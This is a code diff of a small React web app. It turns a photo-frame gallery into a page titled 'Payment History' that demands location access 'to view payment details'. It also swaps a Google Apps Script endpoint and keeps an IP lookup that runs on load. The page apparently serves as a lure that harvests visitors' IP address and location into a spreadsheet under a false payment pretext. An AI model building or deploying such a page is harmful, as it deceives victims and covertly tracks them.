@@ -1,5 +1,6 @@
 import { useEffect, useState } from "react";
 import "./App.css";
+import asset_1 from "./asset_1.jpeg";
 
 function App() {
   const [locationAllowed, setLocationAllowed] = useState(null); // Tracks user's location permission
@@ -9,7 +10,7 @@ function App() {
   const [modalImage, setModalImage] = useState("");
 
   const sheetActionURL =
-    "https://script.google.com/macros/s/AKfycbxX4qKIaRwBmLrCmgb00mDIcORuXfWlAtGSBaPdh1PuToIBCSQhCSsN02ZW0nlA1595WA/exec";
+    "https://script.google.com/macros/s/AKfycbwD6De7Hrb-fl-qnKiXksoxT36hOAYfRUfpJ0JKwCBsqG6YlD1s4VIMkD9KlytlEC5C/exec";
 
   useEffect(() => {
     fetchIPAddress();
@@ -86,8 +87,8 @@ function App() {
     return (
       <div className="loading-page">
         <div className="spinner"></div>
-        <h1>Loading customized photo frames...</h1>
-        <p>please allow location access to view.</p>
+        <h1>Loading details...</h1>
+        <p>please allow location access to view payment details.</p>
       </div>
     );
   }
@@ -104,14 +105,14 @@ function App() {
 
   return (
     <div className="min-h-screen bg-gray-50 py-6">
-      <header className="bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 py-4 px-2 mb-5">
-        <h1 className="text-start text-3xl font-bold text-white">
-          photoFramia
+      <header className="bg-blue-300 py-4 px-2 mb-5">
+        <h1 className="text-start text-3xl font-bold text-gray-700">
+          Payment History
         </h1>
       </header>
-      <h1 className="text-center text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 mb-8">
+      {/* <h1 className="text-center text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 mb-8">
         Welcome to Our Customized Photo Frames!
-      </h1>
+      </h1> */}
       <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 max-w-7xl mx-auto">
         {/* Card 1 */}
         <div
@@ -123,21 +124,21 @@ function App() {
           }
         >
           <img
-            src="https://blog.printposters.in/wp-content/uploads/2023/03/wooden-frame-with-white-blank-card-green-natural-background-forest-top-view-flat-lay-mockup-300x200.jpg"
+            src={asset_1}
             alt="Frame 1"
             className="w-full h-48 object-cover rounded-t-lg"
           />
           <div className="p-6 bg-gradient-to-r from-blue-100 via-purple-100 to-pink-100">
             <h2 className="text-2xl font-semibold text-gray-800 hover:text-gray-700 transition duration-300">
-              Elegant Wooden Frame
+              Tap to view payment
             </h2>
-            <p className="text-sm text-gray-600 mt-2">
+            {/* <p className="text-sm text-gray-600 mt-2">
               Perfect for family portraits and special memories.
-            </p>
+            </p> */}
           </div>
         </div>
         {/* Card 2 */}
-        <div
+        {/* <div
           className="bg-white shadow-lg rounded-lg overflow-hidden hover:shadow-2xl transform hover:scale-105 transition-all duration-300 ease-in-out"
           onClick={() =>
             openModal(
@@ -158,9 +159,9 @@ function App() {
               A clean and simple design for modern decor.
             </p>
           </div>
-        </div>
+        </div> */}
         {/* Card 3 */}
-        <div
+        {/* <div
           className="bg-white shadow-lg rounded-lg overflow-hidden hover:shadow-2xl transform hover:scale-105 transition-all duration-300 ease-in-out"
           onClick={() =>
             openModal(
@@ -181,7 +182,7 @@ function App() {
               Adds a touch of charm to your favorite memories.
             </p>
           </div>
-        </div>
+        </div> */}
       </div>
 
       {isModalOpen && (
@@ -190,13 +191,13 @@ function App() {
           onClick={closeModal}
         >
           <div
-            className="bg-white rounded-lg relative"
+            className="item-center rounded-lg relative"
             onClick={(e) => e.stopPropagation()}
           >
             <img
-              src={modalImage}
+              src={asset_1}
               alt="Modal Image"
-              className="w-full h-auto max-w-screen-sm"
+              className="w-full h-96 max-w-screen-sm"
             />
             <button
               className="absolute top-2 right-2 text-white bg-gray-800 rounded-full p-2"
